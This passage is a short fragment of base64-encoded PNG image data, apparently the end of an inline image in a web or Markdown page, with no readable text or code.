MCso7wAAAABmBeUdAAAAwKygvAMAAACYFZR3AAAAALOC8g4AAABgVlDeAQAAAMwKyjsAAACAWUF5BwAAADArKO8AAAAAZgXlHQAAAMCsoLwDAAAAmBFPP/f/BzUaN4l9xPHuAAAAAElFTkSuQmCC)